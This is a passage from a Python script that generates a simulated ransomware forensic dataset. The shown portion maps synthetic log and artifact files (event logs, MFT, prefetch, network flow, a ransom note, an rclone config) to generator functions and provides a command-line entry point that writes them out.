    "mft.csv": generate_mft,
    "usn-journal.csv": generate_usn_journal,
    "encrypted-files-inventory.csv": generate_encrypted_files_inventory,
    "security-evtx.csv": generate_security_evtx,
    "dc-security-evtx.csv": generate_dc_security_evtx,
    "jumphost-security-evtx.csv": generate_jumphost_security_evtx,
    "system-evtx.csv": generate_system_evtx,
    "defender-evtx.csv": generate_defender_evtx,
    "terminalservices-evtx.csv": generate_terminalservices_evtx,
    "powershell-evtx.csv": generate_powershell_evtx,
    "prefetch.csv": generate_prefetch,
    "amcache.csv": generate_amcache,
    "shimcache.csv": generate_shimcache,
    "registry-runkeys.csv": generate_registry_runkeys,
    "network-flow.csv": generate_network_flow,
    "srum.csv": generate_srum,
}

RENDERERS: Dict[str, Callable[[World], str]] = {
    "ransom-note.txt": render_ransom_note,
    "rclone-conf-recovered.txt": render_rclone_conf,
    "vssadmin-list-shadows.txt": render_vssadmin_output,
}


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def write_csv(path: Path, fields: List[str],
              rows: List[Dict[str, str]]) -> None:
    with path.open("w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=fields,
                                quoting=csv.QUOTE_MINIMAL,
                                lineterminator="\n", extrasaction="ignore")
        writer.writeheader()
        for row in rows:
            writer.writerow({f: row.get(f, "") for f in fields})


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        description="Regenerate the ACCT-FS01 simulated ransomware dataset.")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print what would be written; touch nothing.")
    parser.add_argument("--out-dir", default=".",
                        help="Directory to write files into (default: cwd).")
    parser.add_argument("--seed", type=lambda x: int(x, 0),
                        default=RANDOM_SEED,
                        help="Override the random seed.")
    args = parser.parse_args(argv)

    out_dir = Path(args.out_dir).resolve()
    world = World(args.seed)

    print(f"ACCT-FS01 ransomware generator — seed=0x{args.seed:X}")
    print(f"Output directory: {out_dir}")
    print(f"Encrypted files: {len(world.files)} across "
          f"{len(ENCRYPTED_DIRS)} directories "
          f"({world.encrypted_bytes} bytes)")
    print(f"Staged archives: {len(world.archives)} volumes "
          f"({world.staged_bytes} bytes)")
    if args.dry_run:
        print("Mode: --dry-run (no files written)")
    print()

    if not args.dry_run:
        out_dir.mkdir(parents=True, exist_ok=True)

    for filename, generator in GENERATORS.items():
        # Each generator gets its own deterministic stream, derived with a
        # process-stable hash so that adding or removing a generator does
        # not disturb the others' output.
        local_rng = random.Random(stable_seed(args.seed, filename))
        rows = generator(local_rng, world)
        fields = HEADERS[filename]
        print(f"  {filename:<34} -> {len(rows):>5} rows "
              f"({len(fields)} columns)")
        if not args.dry_run:
            write_csv(out_dir / filename, fields, rows)

    for filename, renderer in RENDERERS.items():
        text = renderer(world)
        print(f"  {filename:<34} -> {len(text.splitlines()):>5} lines")
        if not args.dry_run:
            (out_dir / filename).write_text(text, encoding="utf-8")

    if args.dry_run:
        print("\nDry run complete. Re-run without --dry-run to write files.")
    else:
        print("\nDone.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
